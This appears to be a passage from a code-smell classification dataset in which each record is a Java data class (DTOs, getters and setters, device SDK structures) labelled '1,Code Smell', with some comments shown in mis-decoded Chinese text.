    this.AccessKeyId=AccessKeyId;
    this.SecretAccessKey=SecretAccessKey;
    this.Endpoint=Endpoint;
  }
  public String getAccessKeyId(){
    return AccessKeyId;
  }
  public void setAccessKeyId(  String AccessKeyId){
    this.AccessKeyId=AccessKeyId;
  }
  public String getSecretAccessKey(){
    return SecretAccessKey;
  }
  public void setSecretAccessKey(  String SecretAccessKey){
    this.SecretAccessKey=SecretAccessKey;
  }
  public String getEndpoint(){
    return Endpoint;
  }
  public void setEndpoint(  String Endpoint){
    this.Endpoint=Endpoint;
  }
}
",1,Code Smell
"/** 
 * @author priyamvora
 * @created 24/04/2021
 */
public class Movie {
  private final String movieId;
  private final String name;
  private final String genre;
  private final String language;
  private final Date releaseDate;
  private final Integer duration;
  public Movie(  String name,  String genre,  String language,  Date releaseDate,  Integer duration){
    this.movieId=UUID.randomUUID().toString();
    this.name=name;
    this.genre=genre;
    this.language=language;
    this.releaseDate=releaseDate;
    this.duration=duration;
  }
  public String getMovieId(){
    return movieId;
  }
  public String getName(){
    return name;
  }
  public String getGenre(){
    return genre;
  }
  public String getLanguage(){
    return language;
  }
  public Date getReleaseDate(){
    return releaseDate;
  }
  public Integer getDuration(){
    return duration;
  }
}",1,Code Smell
"public static class LevelValue {
  public static final String QD_WAREHOUSE_CODE=""HPFM.COMPANY"";
  public static final String ADJUST_RECORD_CODE=""HPFM.COMPANY"";
  public static final String MOVE_RECORD_CODE=""HPFM.COMPANY"";
  public static final String RESERVE_RECORD_CODE=""HPFM.COMPANY"";
  public static final String DISTRIBUTE_PLAN=""HPFM.COMPANY"";
  public static final String LOG_LEVEL=""GLOBAL"";
}
",1,Code Smell
"public static class ALARM_BATTERYLOWPOWER_INFO extends SdkStructure {
  public int dwSize;
  public int nAction;
  public int nBatteryLeft;
  public NET_TIME stTime;
  public int nChannelID;
  public NET_GPS_STATUS_INFO stGPSStatus;
  public ALARM_BATTERYLOWPOWER_INFO(){
    this.dwSize=this.size();
  }
}
",1,Code Smell
"public static class NET_REMOTE_UPGRADER_STATE extends SdkStructure {
  public int nChannel;
  public int emState;
  public int nProgress;
  public byte[] szDeviceID=new byte[128];
}",1,Code Smell
"/** 
 * @author nicholas
 * @version $Id: Subscriber.java, v 0.1 2019-05-28 涓嬪崍10:47 nicholas Exp $$
 */
public class Subscriber implements Serializable {
  private String addrStr;
  private String agent;
  private String app;
  private String ip;
  private String namespaceId;
  private String serviceName;
  public Subscriber(  String addrStr,  String agent,  String app,  String ip,  String namespaceId,  String serviceName){
    this.addrStr=addrStr;
    this.agent=agent;
    this.app=app;
    this.ip=ip;
    this.namespaceId=namespaceId;
    this.serviceName=serviceName;
  }
  public String getAddrStr(){
    return addrStr;
  }
  public void setAddrStr(  String addrStr){
    this.addrStr=addrStr;
  }
  public String getAgent(){
    return agent;
  }
  public void setAgent(  String agent){
    this.agent=agent;
  }
  public String getApp(){
    return app;
  }
  public void setApp(  String app){
    this.app=app;
  }
  public String getIp(){
    return ip;
  }
  public void setIp(  String ip){
    this.ip=ip;
  }
  public String getNamespaceId(){
    return namespaceId;
  }
  public void setNamespaceId(  String namespaceId){
    this.namespaceId=namespaceId;
  }
  public String getServiceName(){
    return serviceName;
  }
  public void setServiceName(  String serviceName){
    this.serviceName=serviceName;
  }
  @Override public boolean equals(  Object o){
    if (this == o) {
      return true;
    }
    if (o == null || getClass() != o.getClass()) {
      return false;
    }
    Subscriber that=(Subscriber)o;
    return Objects.equals(addrStr,that.addrStr) && Objects.equals(agent,that.agent) && Objects.equals(app,that.app)&& Objects.equals(ip,that.ip)&& Objects.equals(namespaceId,that.namespaceId)&& Objects.equals(serviceName,that.serviceName);
  }
  @Override public int hashCode(){
    return Objects.hash(addrStr,agent,app,ip,namespaceId,serviceName);
  }
  @Override public String toString(){
    return ""Subscriber{"" + ""addrStr='"" + addrStr + '\''+ "", agent='""+ agent+ '\''+ "", app='""+ app+ '\''+ "", ip='""+ ip+ '\''+ "", namespaceId='""+ namespaceId+ '\''+ "", serviceName='""+ serviceName+ '\''+ '}';
  }
}",1,Code Smell
"public static class DEV_EVENT_GARBAGE_EXPOSURE_INFO extends SdkStructure {
  public int nChannelID;
  public int nAction;
  public byte[] szName=new byte[128];
  public double PTS;
  public NET_TIME_EX UTC;
  public int nEventID;
  public NET_EVENT_FILE_INFO stuFileInfo;
  public NET_POINT[] DetectRegion=new NET_POINT[NET_MAX_DETECT_REGION_NUM];
  public int nDetectRegionNum;
  public NET_MSG_OBJECT[] stuObjects=new NET_MSG_OBJECT[HDBJ_MAX_OBJECTS_NUM];
  public int nObjectNum;
  public EVENT_INTELLI_COMM_INFO stuIntelliCommInfo;
  public byte[] szPresetName=new byte[64];
  public int nViolationDuration;
  public byte[] szSourceID=new byte[32];
  public int dwSnapFlagMask;
  public byte[] bReserved=new byte[4092];
}",1,Code Smell
"public static class DEV_EVENT_TRAFFIC_UTURN_INFO extends SdkStructure {
  public int nChannelID;
  public byte[] szName=new byte[128];
  public byte[] bReserved1=new byte[4];
  public double PTS;
  public NET_TIME_EX UTC;
  public int nEventID;
  public int nLane;
  public NET_MSG_OBJECT stuObject;
  public NET_MSG_OBJECT stuVehicle;
  public NET_EVENT_FILE_INFO stuFileInfo;
  public int nSequence;
  public int nSpeed;
  public byte bEventAction;
  public byte[] byReserved=new byte[2];
  public byte byImageIndex;
  public int dwSnapFlagMask;
  public NET_RESOLUTION_INFO stuResolution;
  public NET_GPS_INFO stuGPSInfo;
  public byte[] bReserved=new byte[968];
  public DEV_EVENT_TRAFFIC_TRAFFICCAR_INFO stTrafficCar;
  public EVENT_COMM_INFO stCommInfo;
}",1,Code Smell
"private static class BulkRequests {
  private long lastFlushTime;
  private BulkRequestBuilderWrapper bulkRequestBuilder;
  public long getLastFlushTime(){
    return lastFlushTime;
  }
  public void setLastFlushTime(  long lastFlushTime){
    this.lastFlushTime=lastFlushTime;
  }
  public BulkRequestBuilderWrapper getBulkRequestBuilder(){
    return bulkRequestBuilder;
  }
  public void setBulkRequestBuilder(  BulkRequestBuilder bulkRequestBuilder){
    this.bulkRequestBuilder=new BulkRequestBuilderWrapper(bulkRequestBuilder);
  }
  BulkRequests(  long lastFlushTime,  BulkRequestBuilder bulkRequestBuilder){
    this.lastFlushTime=lastFlushTime;
    this.bulkRequestBuilder=new BulkRequestBuilderWrapper(bulkRequestBuilder);
  }
}
private static class BulkRequests {
  private final long lastFlushTime;
  private final BulkRequestWrapper bulkRequest;
  long getLastFlushTime(){
    return lastFlushTime;
  }
  BulkRequestWrapper getBulkRequest(){
    return bulkRequest;
  }
  BulkRequests(  long lastFlushTime,  BulkRequest bulkRequest){
    this.lastFlushTime=lastFlushTime;
    this.bulkRequest=new BulkRequestWrapper(bulkRequest);
  }
}
",1,Code Smell
"public class NET_DVR_PU_STREAM_CFG_V41 extends Structure {
  public int dwSize;
  public byte byStreamMode;
  public byte byStreamEncrypt;
  public byte[] byRes1=new byte[2];
  public NET_DVR_DEC_STREAM_MODE uDecStreamMode;
  public int dwDecDelayTime;
  public byte[] sStreamPassword=new byte[STREAM_PASSWD_LEN];
  public byte[] byRes2=new byte[48];
}",1,Code Smell
"public class UnifiedCountSummary {
  private final int min;
  private final double average;
  private final int max;
  private final int diff;
  private final int sum;
  private final int threads;
  public UnifiedCountSummary(  int min,  double average,  int max,  int diff,  int sum,  int threads){
    this.min=min;
    this.average=average;
    this.max=max;
    this.diff=diff;
    this.sum=sum;
    this.threads=threads;
  }
  public int getMin(){
    return min;
  }
  public double getAverage(){
    return average;
  }
  public int getMax(){
    return max;
  }
  public int getDiff(){
    return diff;
  }
  public int getSum(){
    return sum;
  }
  public int getThreads(){
    return this.threads;
  }
}
",1,Code Smell
"public static class DataBean {
  /** 
 * title : 涓崍 url : url content : content
 */
  public String title;
  public String url;
  public String content;
  public String getTitle(){
    return title;
  }
  public void setTitle(  String title){
    this.title=title;
  }
  public String getUrl(){
    return url;
  }
  public void setUrl(  String url){
    this.url=url;
  }
  public String getContent(){
    return content;
  }
  public void setContent(  String content){
    this.content=content;
  }
}
",1,Code Smell
"/** 
 * className锛欶ACERECOGNITION_PERSON_INFOEX description锛� 浜哄憳淇℃伅鎵╁睍缁撴瀯浣� author锛�251589 createTime锛�2020/12/28 10:47
 * @version v1.0
 */
public class FACERECOGNITION_PERSON_INFOEX extends NetSDKLib.SdkStructure {
  public byte[] szPersonName=new byte[NET_MAX_PERSON_NAME_LEN];
  public short wYear;
  public byte byMonth;
  public byte byDay;
  public byte bImportantRank;
  public byte bySex;
  public byte[] szID=new byte[NET_MAX_PERSON_ID_LEN];
  public short wFacePicNum;
  public Net_PIC_INFO[] szFacePicInfo=new Net_PIC_INFO[NET_MAX_PERSON_IMAGE_NUM];
  public byte byType;
  public byte byIDType;
  public byte byGlasses;
  public byte byAge;
  public byte[] szProvince=new byte[NET_MAX_PROVINCE_NAME_LEN];
  public byte[] szCity=new byte[NET_MAX_CITY_NAME_LEN];
  public byte[] szUID=new byte[NET_MAX_PERSON_ID_LEN];
  public byte[] szCountry=new byte[NET_COUNTRY_LENGTH];
  public byte byIsCustomType;
  public byte[] szCustomType=new byte[NET_COMMON_STRING_16];
  public byte[] szComment=new byte[NET_COMMENT_LENGTH];
  public byte[] szGroupID=new byte[NET_GROUPID_LENGTH];
  public byte[] szGroupName=new byte[NET_GROUPNAME_LENGTH];
  public int emEmotion;
  public byte[] szHomeAddress=new byte[NET_COMMON_STRING_128];
  public int emGlassesType;
  public int emRace;
  public int emEye;
  public int emMouth;
  public int emMask;
  public int emBeard;
  public int nAttractive;
  public int emFeatureState;
  public int bAgeEnable;
  public int[] nAgeRange=new int[2];
  public int nEmotionValidNum;
  public int[] emEmotions=new int[NET_MAX_FACEDETECT_FEATURE_NUM];
  public int nCustomPersonInfoNum;
  public CUSTOM_PERSON_INFO[] szCustomPersonInfo=new CUSTOM_PERSON_INFO[NET_MAX_CUSTOM_PERSON_INFO_NUM];
  public int emRegisterDbType;
  public NET_TIME stuEffectiveTime;
  public int emFeatureErrCode;
  public int wFacePicNumEx;
  public NET_FACE_PIC_INFO[] szFacePicInfoEx=new NET_FACE_PIC_INFO[6];
  public NET_PERSON_FEATURE_VALUE_INFO stuPersonFeatureValue;
  public byte[] byReserved=new byte[396];
}",1,Code Smell
"public final class GProConvertThirdIdReq {
  long appId;
  ArrayList<String> ids;
  ArrayList<String> stringIds;
  int type;
  public GProConvertThirdIdReq(){
    this.ids=new ArrayList<>();
    this.stringIds=new ArrayList<>();
  }
  public long getAppId(){
    return this.appId;
  }
  public ArrayList<String> getIds(){
    return this.ids;
  }
  public ArrayList<String> getStringIds(){
    return this.stringIds;
  }
  public int getType(){
    return this.type;
  }
  public String toString(){
    return ""GProConvertThirdIdReq{type="" + this.type + "",ids=""+ this.ids+ "",appId=""+ this.appId+ "",stringIds=""+ this.stringIds+ "",}"";
  }
  public GProConvertThirdIdReq(  int i2,  ArrayList<String> arrayList,  long j2,  ArrayList<String> arrayList2){
    this.ids=new ArrayList<>();
    this.stringIds=new ArrayList<>();
    this.type=i2;
    this.ids=arrayList;
    this.appId=j2;
    this.stringIds=arrayList2;
  }
}",1,Code Smell
"public static class NET_DVR_CARD_RECORD extends Structure {
  public int dwSize;
  public byte[] byCardNo=new byte[ACS_CARD_NO_LEN];
  public byte byCardType;
  public byte byLeaderCard;
  public byte byUserType;
  public byte byRes1;
  public byte[] byDoorRight=new byte[MAX_DOOR_NUM_256];
  public NET_DVR_VALID_PERIOD_CFG struValid=new NET_DVR_VALID_PERIOD_CFG();
  public byte[] byBelongGroup=new byte[MAX_GROUP_NUM_128];
  public byte[] byCardPassword=new byte[CARD_PASSWORD_LEN];
  public short[] wCardRightPlan=new short[MAX_DOOR_NUM_256];
  public int dwMaxSwipeTimes;
  public int dwSwipeTimes;
  public int dwEmployeeNo;
  public byte[] byName=new byte[NAME_LEN];
  public int dwCardRight;
  public byte[] byRes=new byte[256];
}",1,Code Smell
"/** 
 * @author jiangbo
 */
public class TableDTO {
  private Long tenantId;
  private Long userId;
  private String tableName;
  private String tableDesc;
  private List<ColumnDTO> columns;
  private List<ColumnDTO> addColumns;
  private List<ColumnDTO> partitionKeys;
  private String delim;
  private String location;
  private Integer lifeDay;
  private Long catalogueId;
  private String storedType;
  private Long tableId;
  public Long getTableId(){
    return tableId;
  }
  public void setTableId(  Long tableId){
    this.tableId=tableId;
  }
  public Long getTenantId(){
    return tenantId;
  }
  public void setTenantId(  Long tenantId){
    this.tenantId=tenantId;
  }
  public Long getUserId(){
    return userId;
  }
  public void setUserId(  Long userId){
    this.userId=userId;
  }
  public String getTableName(){
    return tableName;
  }
  public void setTableName(  String tableName){
    this.tableName=tableName;
  }
  public String getTableDesc(){
    return tableDesc;
  }
  public void setTableDesc(  String tableDesc){
    this.tableDesc=tableDesc;
  }
  public List<ColumnDTO> getColumns(){
    return columns;
  }
  public void setColumns(  List<ColumnDTO> columns){
    this.columns=columns;
  }
  public List<ColumnDTO> getAddColumns(){
    return addColumns;
  }
  public void setAddColumns(  List<ColumnDTO> addColumns){
    this.addColumns=addColumns;
  }
  public List<ColumnDTO> getPartitionKeys(){
    return partitionKeys;
  }
  public void setPartitionKeys(  List<ColumnDTO> partitionKeys){
    this.partitionKeys=partitionKeys;
  }
  public String getDelim(){
    return delim;
  }
  public void setDelim(  String delim){
    this.delim=delim;
  }
  public String getLocation(){
    return location;
  }
  public void setLocation(  String location){
    this.location=location;
  }
  public Integer getLifeDay(){
    return lifeDay;
  }
  public void setLifeDay(  Integer lifeDay){
    this.lifeDay=lifeDay;
  }
  public Long getCatalogueId(){
    return catalogueId;
  }
  public void setCatalogueId(  Long catalogueId){
    this.catalogueId=catalogueId;
  }
  public String getStoredType(){
    return storedType;
  }
  public void setStoredType(  String storedType){
    this.storedType=storedType;
  }
  @Override public String toString(){
    return ""TableDTO{"" + "", tenantId="" + tenantId + "", userId=""+ userId+ "", tableName='""+ tableName+ '\''+ "", tableDesc='""+ tableDesc+ '\''+ '}';
  }
}
",1,Code Smell
"@Schema(description=""绠＄悊鍚庡彴 - ERP 閲囪喘璁㈠崟鍒嗛〉 Request VO"") @Data @EqualsAndHashCode(callSuper=true) @ToString(callSuper=true) public class ErpPurchaseOrderPageReqVO extends PageParam {
  /** 
 * 鍏ュ簱鐘舵�� - 鏃�
 */
  public static final Integer IN_STATUS_NONE=0;
  /** 
 * 鍏ュ簱鐘舵�� - 閮ㄥ垎
 */
  public static final Integer IN_STATUS_PART=1;
  /** 
 * 鍏ュ簱鐘舵�� - 鍏ㄩ儴
 */
  public static final Integer IN_STATUS_ALL=2;
  /** 
 * 閫�璐х姸鎬� - 鏃�
 */
  public static final Integer RETURN_STATUS_NONE=0;
  /** 
 * 閫�璐х姸鎬� - 閮ㄥ垎
 */
  public static final Integer RETURN_STATUS_PART=1;
  /** 
 * 閫�璐х姸鎬� - 鍏ㄩ儴
 */
  public static final Integer RETURN_STATUS_ALL=2;
  @Schema(description=""閲囪喘鍗曠紪鍙�"",example=""XS001"") private String no;
  @Schema(description=""渚涘簲鍟嗙紪鍙�"",example=""1724"") private Long supplierId;
  @Schema(description=""閲囪喘鏃堕棿"") @DateTimeFormat(pattern=FORMAT_YEAR_MONTH_DAY_HOUR_MINUTE_SECOND) private LocalDateTime[] orderTime;
  @Schema(description=""澶囨敞"",example=""浣犵寽"") private String remark;
  @Schema(description=""閲囪喘鐘舵��"",example=""2"") private Integer status;
  @Schema(description=""鍒涘缓鑰�"") private String creator;
  @Schema(description=""浜у搧缂栧彿"",example=""1"") private Long productId;
  @Schema(description=""鍏ュ簱鐘舵��"",example=""2"") private Integer inStatus;
  @Schema(description=""閫�璐х姸鎬�"",example=""2"") private Integer returnStatus;
  @Schema(description=""鏄惁鍙叆搴�"",example=""true"") private Boolean inEnable;
  @Schema(description=""鏄惁鍙��璐�"",example=""true"") private Boolean returnEnable;
}",1,Code Smell
"public static class NET_DVR_ACS_EVENT_INFO_EXTEND_V20 extends Structure {
  public byte byRemoteCheck;
  public byte byThermometryUnit;
  public byte byIsAbnomalTemperature;
  public byte byRes2;
  public float fCurrTemperature;
  public NET_VCA_POINT struRegionCoordinates=new NET_VCA_POINT();
  public int dwQRCodeInfoLen;
  public int dwVisibleLightDataLen;
  public int dwThermalDataLen;
  public Pointer pQRCodeInfo;
  public Pointer pVisibleLightData;
  public Pointer pThermalData;
  public byte[] byRes=new byte[1024];
}",1,Code Smell
"/** 
 * TODO Comment of Image
 * @author tony.chenl
 */
public class Image implements Serializable {
  String name;
  InputStream is;
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public InputStream getIs(){
    return is;
  }
  public void setIs(  InputStream is){
    this.is=is;
  }
}
",1,Code Smell
"public class GetServiceRequest extends AutoSafeParcelable {
  @SafeParceled(1) int versionCode=6;
  @SafeParceled(2) public int serviceId;
  @SafeParceled(3) public int gmsVersion;
  @SafeParceled(4) public String packageName;
  @SafeParceled(5) public IBinder accountAccessor;
  @SafeParceled(6) public Scope[] scopes;
  @SafeParceled(7) public Bundle extras;
  @SafeParceled(8) public Account account;
  @SafeParceled(9) @Deprecated long field9;
  @SafeParceled(10) public Feature[] defaultFeatures;
  @SafeParceled(11) public Feature[] apiFeatures;
  @SafeParceled(12) boolean supportsConnectionInfo;
  @SafeParceled(13) int field13;
  @SafeParceled(14) boolean field14;
  @SafeParceled(15) String attributionTag;
  public static final Creator<GetServiceRequest> CREATOR=new AutoCreator<>(GetServiceRequest.class);
}",1,Code Smell
"public static class ClientTypeDescription {
  public static final String JAVA_CLIENT=""Nacos-Java-Client"";
  public static final String DNSF_CLIENT=""Nacos-DNS"";
  public static final String C_CLIENT=""Nacos-C-Client"";
  public static final String SDK_CLIENT=""Nacos-SDK-Java"";
  public static final String NGINX_CLIENT=""unit-nginx"";
  public static final String CPP_CLIENT=""vip-client4cpp"";
  public static final String GO_CLIENT=""nacos-go-sdk"";
}",1,Code Smell
"public class CfCarParkCarTypeForm implements Serializable {
  private String id;
  private String name;
  private String flagKey;
  private String image;
  private String description;
  private Integer sortIndex;
  private static final long serialVersionUID=1L;
  public String getId(){
    return id;
  }
  public void setId(  String id){
    this.id=id == null ? null : id.trim();
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name == null ? null : name.trim();
  }
  public String getFlagKey(){
    return flagKey;
  }
  public void setFlagKey(  String flagKey){
    this.flagKey=flagKey == null ? null : flagKey.trim();
  }
  public String getImage(){
    return image;
  }
  public void setImage(  String image){
    this.image=image == null ? null : image.trim();
  }
  public String getDescription(){
    return description;
  }
  public void setDescription(  String description){
    this.description=description == null ? null : description.trim();
  }
  public Integer getSortIndex(){
    return sortIndex;
  }
  public void setSortIndex(  Integer sortIndex){
    this.sortIndex=sortIndex;
  }
}",1,Code Smell
"public static class ContactInfo extends AutoSafeParcelable {
  @SafeParceled(1) public PersonName name;
  @SafeParceled(2) public String organization;
  @SafeParceled(3) public String title;
  @SafeParceled(4) public Phone[] phones;
  @SafeParceled(5) public Email[] emails;
  @SafeParceled(6) public String[] urls;
  @SafeParceled(7) public Address[] addresses;
  public static final Creator<ContactInfo> CREATOR=new AutoCreator<>(ContactInfo.class);
}",1,Code Smell
"public static class NET_CFG_VideoWidgetSensorInfo_Description extends SdkStructure {
  public int nStructSize;
  public int nSensorID;
  public byte[] szDevID=new byte[CFG_COMMON_STRING_32];
  public byte[] szPointID=new byte[CFG_COMMON_STRING_32];
  public byte[] szText=new byte[CFG_COMMON_STRING_256];
  public NET_CFG_VideoWidgetSensorInfo_Description(){
    this.nStructSize=this.size();
  }
}",1,Code Smell
"/** 
 * 璁㈤槄娑堟伅绫诲瀷
 */
public class SubscribeMessageType {
  public final static String PAY_SUCCESSFUL=""pay_successful"";
  public final static String MONTHLY_CARD_EXPIRATION_NOTICE=""monthly_card_expiration_notice"";
  public final static String COUPON_NOTIFICATION=""coupon_notification"";
  public final static String ADVANCE_PAYMENT_NOTICE=""advance_payment_notice"";
}
",1,Code Smell
"public final class GProRetentionChannelInfo implements Serializable {
  String guildCover;
  String guildIcon;
  long guildId;
  String guildName;
  String guildProfile;
  String joinSig;
  long serialVersionUID;
  ArrayList<GProRetentionChannelLabel> tagList;
  public GProRetentionChannelInfo(){
    this.serialVersionUID=1L;
    this.guildName="""";
    this.guildIcon="""";
    this.guildProfile="""";
    this.guildCover="""";
    this.joinSig="""";
    this.tagList=new ArrayList<>();
  }
  public String getGuildCover(){
    return this.guildCover;
  }
  public String getGuildIcon(){
    return this.guildIcon;
  }
  public long getGuildId(){
    return this.guildId;
  }
  public String getGuildName(){
    return this.guildName;
  }
  public String getGuildProfile(){
    return this.guildProfile;
  }
  public String getJoinSig(){
    return this.joinSig;
  }
  public ArrayList<GProRetentionChannelLabel> getTagList(){
    return this.tagList;
  }
  public String toString(){
    return ""GProRetentionChannelInfo{guildId="" + this.guildId + "",guildName=""+ this.guildName+ "",guildIcon=""+ this.guildIcon+ "",guildProfile=""+ this.guildProfile+ "",guildCover=""+ this.guildCover+ "",joinSig=""+ this.joinSig+ "",tagList=""+ this.tagList+ "",}"";
  }
  public GProRetentionChannelInfo(  long j2,  String str,  String str2,  String str3,  String str4,  String str5,  ArrayList<GProRetentionChannelLabel> arrayList){
    this.serialVersionUID=1L;
    this.guildName="""";
    this.guildIcon="""";
    this.guildProfile="""";
    this.guildCover="""";
    this.joinSig="""";
    this.tagList=new ArrayList<>();
    this.guildId=j2;
    this.guildName=str;
    this.guildIcon=str2;
    this.guildProfile=str3;
    this.guildCover=str4;
    this.joinSig=str5;
    this.tagList=arrayList;
  }
}",1,Code Smell
"public static class MsgHead extends MessageMicro<MsgHead> {
  public final PBUInt64Field from_uin=PBField.initUInt64(0);
  public final PBUInt64Field to_uin=PBField.initUInt64(0);
  public final PBUInt32Field msg_type=PBField.initUInt32(0);
  public final PBUInt32Field c2c_cmd=PBField.initUInt32(0);
  public final PBUInt32Field msg_seq=PBField.initUInt32(0);
  public final PBUInt32Field msg_time=PBField.initUInt32(0);
  public final PBUInt64Field msg_uid=PBField.initUInt64(0);
  public GroupInfo group_info=new GroupInfo();
  public final PBUInt32Field from_appid=PBField.initUInt32(0);
  public final PBUInt32Field from_instid=PBField.initUInt32(0);
  public final PBUInt32Field user_active=PBField.initUInt32(0);
  public final PBStringField from_nick=PBField.initString("""");
  public final PBUInt64Field auth_uin=PBField.initUInt64(0);
  public final PBStringField auth_nick=PBField.initString("""");
  public final PBUInt32Field msg_flag=PBField.initUInt32(0);
  public final PBStringField auth_remark=PBField.initString("""");
  public final PBStringField group_name=PBField.initString("""");
  public MutilTransHead mutiltrans_head=new MutilTransHead();
  public final PBUInt32Field public_account_group_send_flag=PBField.initUInt32(0);
  public final PBUInt32Field wseq_in_c2c_msghead=PBField.initUInt32(0);
  public final PBUInt64Field cpid=PBField.initUInt64(0);
  public final PBStringField multi_compatible_text=PBField.initString("""");
  public final PBUInt32Field auth_sex=PBField.initUInt32(0);
  public final PBBoolField is_src_msg=PBField.initBool(false);
}",1,Code Smell
"public class TestWorkflowInput {
  private String name;
  private String zipCode;
  private String countryCode;
  public TestWorkflowInput(  String name,  String zipCode,  String countryCode){
    this.name=name;
    this.zipCode=zipCode;
    this.countryCode=countryCode;
  }
  public TestWorkflowInput(){
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getZipCode(){
    return zipCode;
  }
  public void setZipCode(  String zipCode){
    this.zipCode=zipCode;
  }
  public String getCountryCode(){
    return countryCode;
  }
  public void setCountryCode(  String countryCode){
    this.countryCode=countryCode;
  }
}
",1,Code Smell
"public class BoundaryEvent extends CatchEvent {
  private boolean cancelActivity;
  private String attachedToRef;
  public boolean isCancelActivity(){
    return cancelActivity;
  }
  public void setCancelActivity(  boolean cancelActivity){
    this.cancelActivity=cancelActivity;
  }
  public String getAttachedToRef(){
    return attachedToRef;
  }
  public void setAttachedToRef(  String attachedToRef){
    this.attachedToRef=attachedToRef;
  }
}
",1,Code Smell
"public static class ZipItem {
  private String itemName;
  private String itemData;
  public ZipItem(  String itemName,  String itemData){
    this.itemName=itemName;
    this.itemData=itemData;
  }
  public String getItemName(){
    return itemName;
  }
  public void setItemName(  String itemName){
    this.itemName=itemName;
  }
  public String getItemData(){
    return itemData;
  }
  public void setItemData(  String itemData){
    this.itemData=itemData;
  }
}
",1,Code Smell
"public static class DEV_EVENT_TRAFFIC_OVERSPEED_INFO extends SdkStructure {
  public int nChannelID;
  public byte[] szName=new byte[128];
  public byte[] bReserved1=new byte[4];
  public double PTS;
  public NET_TIME_EX UTC;
  public int nEventID;
  public int nLane;
  public NET_MSG_OBJECT stuObject;
  public NET_MSG_OBJECT stuVehicle;
  public NET_EVENT_FILE_INFO stuFileInfo;
  public int nSpeed;
  public int nSpeedUpperLimit;
  public int nSpeedLowerLimit;
  public int nSequence;
  public byte bEventAction;
  public byte[] byReserved=new byte[2];
  public byte byImageIndex;
  public int dwSnapFlagMask;
  public NET_RESOLUTION_INFO stuResolution;
  public byte[] szFilePath=new byte[MAX_PATH];
  public EVENT_INTELLI_COMM_INFO stuIntelliCommInfo;
  public NET_GPS_INFO stuGPSInfo;
  public int nSpeedingPercentage;
  public byte[] bReserved=new byte[572];
  public DEV_EVENT_TRAFFIC_TRAFFICCAR_INFO stTrafficCar;
  public EVENT_COMM_INFO stCommInfo;
}",1,Code Smell
"/** 
 * @author xcs
 * @date 2023骞�12鏈�04鏃� 14鏃�13鍒�
 */
public class Person {
  private String name;
  private int age;
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public int getAge(){
    return age;
  }
  public void setAge(  int age){
    this.age=age;
  }
}",1,Code Smell
"public class Cell {
  private final int row, col;
  private CellType cellType;
  public Cell(  int row,  int col){
    this.row=row;
    this.col=col;
  }
  public CellType getCellType(){
    return cellType;
  }
  public void setCellType(  CellType cellType){
    this.cellType=cellType;
  }
  public int getRow(){
    return row;
  }
  public int getCol(){
    return col;
  }
}
public class Cell {
  private final int row, col;
  private CellType cellType;
  public Cell(  int row,  int col){
    this.row=row;
    this.col=col;
  }
  public CellType getCellType(){
    return cellType;
  }
  public void setCellType(  CellType cellType){
    this.cellType=cellType;
  }
  public int getRow(){
    return row;
  }
  public int getCol(){
    return col;
  }
}
",1,Code Smell
"public static class ALARM_POLLING_ALARM_INFO extends SdkStructure {
  public NET_TIME_EX stuTime;
  public boolean bRealUTC;
  public NET_TIME_EX RealUTC;
  public byte[] byReserved=new byte[974];
}",1,Code Smell
"@Data public class AzureCompletions {
  @JsonProperty(value=""id"") private String id;
  @JsonProperty(value=""created"") private int created;
  @JsonProperty(value=""choices"") private List<AzureChoice> choices;
  @JsonProperty(value=""usage"") private AzureCompletionsUsage usage;
  /** 
 * Creates an instance of Completions class.
 * @param id the id value to set.
 * @param created the created value to set.
 * @param choices the choices value to set.
 * @param usage the usage value to set.
 */
  @JsonCreator private AzureCompletions(  @JsonProperty(value=""id"") String id,  @JsonProperty(value=""created"") int created,  @JsonProperty(value=""choices"") List<AzureChoice> choices,  @JsonProperty(value=""usage"") AzureCompletionsUsage usage){
    this.id=id;
    this.created=created;
    this.choices=choices;
    this.usage=usage;
  }
  /** 
 * Get the id property: A unique identifier associated with this completions response.
 * @return the id value.
 */
  public String getId(){
    return this.id;
  }
  /** 
 * Get the created property: The first timestamp associated with generation activity for this completions response, represented as seconds since the beginning of the Unix epoch of 00:00 on 1 Jan 1970.
 * @return the created value.
 */
  public int getCreated(){
    return this.created;
  }
  /** 
 * Get the choices property: The collection of completions choices associated with this completions response. Generally, `n` choices are generated per provided prompt with a default value of 1. Token limits and other settings may limit the number of choices generated.
 * @return the choices value.
 */
  public List<AzureChoice> getChoices(){
    return this.choices;
  }
  /** 
 * Get the usage property: Usage information for tokens processed and generated as part of this completions operation.
 * @return the usage value.
 */
  public AzureCompletionsUsage getUsage(){
    return this.usage;
  }
}",1,Code Smell
"public class TaskReportDTO extends Task {
  private List<HistoryCloudTaskDTO> historyCloudTaskDTOList;
  private List<HistoryResourceReportDTO> historyCloudResourceReportDTOList;
  private List<HistoryServerResult> historyServerResultList;
  private List<HistoryImageReportDTO> historyImageReportDTOList;
  private List<HistoryCodeReportDTO> historyCodeReportDTOList;
  private List<HistoryConfigReportDTO> historyConfigReportDTOList;
  private List<HistoryK8sReportDTO> historyK8sReportDTOList;
  private List<HistoryFsReportDTO> historyFsReportDTOList;
  public List<HistoryCloudTaskDTO> getHistoryCloudTaskDTOList(){
    return historyCloudTaskDTOList;
  }
  public void setHistoryCloudTaskDTOList(  List<HistoryCloudTaskDTO> historyCloudTaskDTOList){
    this.historyCloudTaskDTOList=historyCloudTaskDTOList;
  }
  public List<HistoryResourceReportDTO> getHistoryCloudResourceReportDTOList(){
    return historyCloudResourceReportDTOList;
  }
  public void setHistoryCloudResourceReportDTOList(  List<HistoryResourceReportDTO> historyCloudResourceReportDTOList){
    this.historyCloudResourceReportDTOList=historyCloudResourceReportDTOList;
  }
  public List<HistoryServerResult> getHistoryServerResultList(){
    return historyServerResultList;
  }
  public void setHistoryServerResultList(  List<HistoryServerResult> historyServerResultList){
    this.historyServerResultList=historyServerResultList;
  }
  public List<HistoryCodeReportDTO> getHistoryCodeReportDTOList(){
    return historyCodeReportDTOList;
  }
  public void setHistoryCodeReportDTOList(  List<HistoryCodeReportDTO> historyCodeReportDTOList){
    this.historyCodeReportDTOList=historyCodeReportDTOList;
  }
  public List<HistoryImageReportDTO> getHistoryImageReportDTOList(){
    return historyImageReportDTOList;
  }
  public void setHistoryImageReportDTOList(  List<HistoryImageReportDTO> historyImageReportDTOList){
    this.historyImageReportDTOList=historyImageReportDTOList;
  }
